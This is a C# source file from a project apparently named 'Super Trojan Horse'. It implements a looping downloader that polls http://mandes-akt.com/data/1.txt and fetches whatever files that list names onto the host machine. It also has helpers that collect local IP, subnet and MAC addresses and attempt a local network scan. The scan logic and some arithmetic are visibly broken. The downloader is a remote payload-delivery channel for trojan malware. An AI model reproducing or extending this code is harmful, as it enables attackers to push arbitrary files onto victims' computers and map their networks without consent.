using System;
using System.IO;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;

namespace SuperTroyanHourse
{
    internal class Internet
    {
        public static void getLastModifiededDate()
        {
            const string URL = "http://mandes-akt.com/data/1.txt";
            string destination = Path.GetDirectoryName(Program.CurrentApplication) + "\\temp.dat";
            int Wait = 0x7530;// 0x7530=30000
            for (; Program.isProgramAlive; )
            {
                
                try
                {
                    if(!Directory.Exists(Program.FilesFolder))
                        Directory.CreateDirectory(Program.FilesFolder);
                    using (System.Net.WebClient Client = new System.Net.WebClient())
                    {
                        try
                        {
                            Client.DownloadFile(URL, destination);
                        }
                        catch
                        {
                            Console.WriteLine("error");
                            Thread.Sleep(Wait / 3);
                            Thread.Sleep(Wait / 3);
                            Thread.Sleep(Wait / 3);
                            continue;
                        }
                    }
                    string[] lines = File.ReadAllLines(destination);
                    /*
                     * the organize: [file name on this machine]$[url to server]($[auto{must update}|[date{update date}]] )
                    */
                    string[] p;
                    for (int i = 0; i < lines.Length; i++)
                    {
                        if (lines[i].Contains("$"))
                        {
                            p = lines[i].Split('$');
                            if (p.Length > 2 && p[2] == "auto")
                                if (File.Exists(Program.FilesFolder + p[0]))
                                    File.Delete(Program.FilesFolder + p[0]);
                            if(!File.Exists(Program.FilesFolder + p[0]))
                                using (System.Net.WebClient Client = new System.Net.WebClient())
                                {
                                    Client.DownloadFile(p[1], Program.FilesFolder + p[0]);
                                    Console.WriteLine("downloaded : " + Program.FilesFolder + p[0]);
                                }
                        }
                    }
                    
                }
                finally
                {
                    if (File.Exists(destination))
                        File.Delete(destination);
                    Console.WriteLine("once again");
                }
                Thread.Sleep(Wait / 3);
                Thread.Sleep(Wait / 3);
                Thread.Sleep(Wait / 3);
            }
        }

        public static IPAddress GetLocalIP()
        {
            string myHost = Dns.GetHostName();
            IPAddress myIP = IPAddress.None;
            for (int i = 0; i <= System.Net.Dns.GetHostEntry(myHost).AddressList.Length - 1; i++)
            {
                if (System.Net.Dns.GetHostEntry(myHost).AddressList[i].IsIPv6LinkLocal == false)
                {
                    myIP = Dns.GetHostEntry(myHost).AddressList[i];
                }
            }
            return myIP;
        }

        public static IPAddress GetSubnetMask(IPAddress address)
        {
            foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces())
            {
                foreach (UnicastIPAddressInformation unicastIPAddressInformation in adapter.GetIPProperties().UnicastAddresses)
                {
                    if (unicastIPAddressInformation.Address.AddressFamily == AddressFamily.InterNetwork)
                    {
                        if (address.Equals(unicastIPAddressInformation.Address))
                        {
                            return unicastIPAddressInformation.IPv4Mask;
                        }
                    }
                }
            }
            return IPAddress.None;
        }

        public static IPAddress GetMaxIP()
        {
            long maxSpeed = -1;
            IPAddress ip = null;

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                //string tempMac = nic.GetPhysicalAddress().ToString();
                if (nic.Speed > maxSpeed)
                {
                    maxSpeed = nic.Speed;
                    foreach (var ua in nic.GetIPProperties().UnicastAddresses)
                        if(ua.Address.IsIPv6LinkLocal == false)
                            if(ua.Address.ToString().Split('.').Length == 4)
                                if(ua.Address.ToString().Split('.')[0] != "127")
                                    ip = ua.Address;
                }
            }
            return ip;
        }

        public static IPAddress GetMaxBroadcast()
        {
            IPAddress local = GetMaxIP();
            IPAddress subnet = GetSubnetMask(local);
            uint wildcard = IPAddressToUInt(subnet) ^ 0xffffffff;
            string[] temp = new IPAddress(wildcard + (IPAddressToUInt(subnet) & IPAddressToUInt(local))).ToString().Split('.');
            string[] newTemp = { temp[3], temp[2], temp[1], temp[0] };
            IPAddress ip = IPAddress.Parse(string.Join(".", newTemp));
            return ip;
        }

        public static IPAddress[] GetAllHostsWithOpenPort()
        {
            IPAddress local = GetLocalIP();
            IPAddress subnet = GetSubnetMask(local);
            List<IPAddress> list = new List<IPAddress>();
            uint wildcard = IPAddressToUInt(subnet) ^ 0xffffffff;
            for (uint i = 1; i < wildcard; i++)
            {
                if (i == (wildcard & IPAddressToUInt(local)))
                    continue;
                string[] temp = new IPAddress(i + (IPAddressToUInt(subnet) & IPAddressToUInt(local))).ToString().Split('.');
                string[] newTemp = { temp[3], temp[2], temp[1], temp[0] };
                IPAddress ip = IPAddress.Parse(string.Join(".", newTemp));
                try
                {
                    TcpListener tcpListener = new TcpListener(ip, Program.port);
                    tcpListener.Start();
                    tcpListener.Stop();
                    list.Add(ip);
                }
                catch (SocketException)
                {
                    Console.WriteLine("{0}:{1} isn't aviable", ip.ToString(), Program.port);
                }
            }
            return list.ToArray();
        }

        /// <summary>
        /// Finds the MAC address of the NIC with maximum speed.
        /// </summary>
        /// <returns>The MAC address.</returns>
        public static string GetMacAddress()
        {
            const int MIN_MAC_ADDR_LENGTH = 12;
            string macAddress = string.Empty;
            long maxSpeed = -1;

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                string tempMac = nic.GetPhysicalAddress().ToString();
                if (nic.Speed > maxSpeed && !string.IsNullOrEmpty(tempMac) && tempMac.Length >= MIN_MAC_ADDR_LENGTH)
                {
                    maxSpeed = nic.Speed;
                    macAddress = tempMac;
                }
            }
            string resMac = string.Empty;
            for(int i=0;i<MIN_MAC_ADDR_LENGTH;i++)
                resMac += macAddress[i] + ((i > 0 && i != MIN_MAC_ADDR_LENGTH - 1 && ((i & 0x1) == 0x1)) ? ":" : string.Empty);
                 
            return resMac;
        }

        public static string[] GetAllMacAddresses()
        {
            const uint numebrOfByteInMac = 6;
            NetworkInterface[] all = NetworkInterface.GetAllNetworkInterfaces();
            List<string> result = new List<string>();
            string MAC = string.Empty;
            byte[] mac;
            for (int i = 0; i < all.Length; i++)
            {
                mac = all[i].GetPhysicalAddress().GetAddressBytes();
                MAC = string.Empty;
                if (mac.Length == numebrOfByteInMac)
                {
                    MAC +=       mac[0].ToString("X2");
                    MAC += ':' + mac[1].ToString("X2");
                    MAC += ':' + mac[2].ToString("X2");
                    MAC += ':' + mac[3].ToString("X2");
                    MAC += ':' + mac[4].ToString("X2");
                    MAC += ':' + mac[5].ToString("X2");
                    result.Add(MAC);
                }
            }
            return result.ToArray();
        }

        public static uint IPAddressToUInt(IPAddress ip)
        {
            string[] IP = ip.ToString().Split('.');
            uint r = 0;
            r += uint.Parse(IP[0]) * 0x00ffffff;
            r += uint.Parse(IP[1]) * 0x0000ffff;
            r += uint.Parse(IP[2]) * 0x000000ff;
            r += uint.Parse(IP[3]);
            byte[] list = ip.GetAddressBytes();
            Array.Reverse(list);
            return BitConverter.ToUInt32(list, 0); ;
        }
    }
}